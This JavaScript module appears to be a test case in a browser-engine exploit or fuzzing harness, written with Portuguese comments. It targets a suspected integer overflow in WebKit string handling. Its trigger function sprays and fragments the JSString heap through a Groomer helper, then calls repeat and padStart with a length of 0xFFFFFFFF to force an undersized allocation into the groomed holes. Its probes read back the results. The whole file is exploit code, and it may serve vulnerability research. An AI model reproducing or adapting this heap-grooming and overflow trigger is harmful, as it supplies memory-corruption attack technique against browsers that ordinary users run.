import { Groomer } from '../mod_groomer.js';

export default {
    id:       'STRING_MATH_INTEGER_OVERFLOW',
    category: 'Boundary',
    risk:     'HIGH',
    description:
        'Integer overflow na matemática de strings (WTFString.cpp). ' +
        'O JSString Heap é fragmentado antes para garantir que as novas alocações ' +
        'caiam em buracos corrompidos se o tamanho truncado de 32-bits for usado.',

    setup: function() {
        this.smallStr = "A";
        this.results = {};
    },

    trigger: function() {
        // 🚨 Grooming: Criamos o caos no JSString Heap
        let stringTrash = Groomer.sprayStrings(32, 2000);
        Groomer.punchHoles(stringTrash, 2);

        try {
            // O cálculo (1 * 0xFFFFFFFF) pode truncar e alocar menos memória do que escreve
            this.corrupted1 = this.smallStr.repeat(0xFFFFFFFF);
            this.results.repLen = this.corrupted1.length;
        } catch(e) { this.results.repErr = e.constructor.name; }

        try {
            // padStart tenta calcular (0xFFFFFFFF - 1)
            this.corrupted2 = this.smallStr.padStart(0xFFFFFFFF, "B");
            this.results.padLen = this.corrupted2.length;
        } catch(e) { this.results.padErr = e.constructor.name; }
    },

    probe: [
        s => s.results.repLen ?? s.results.repErr,
        s => s.results.padLen ?? s.results.padErr,
        s => s.corrupted1 ? s.corrupted1.charCodeAt(0) : null,
        s => s.corrupted2 ? s.corrupted2.charCodeAt(0) : null,
    ],

    cleanup: function() {
        this.smallStr = null;
        this.corrupted1 = null;
        this.corrupted2 = null;
        this.results = {};
    }
};
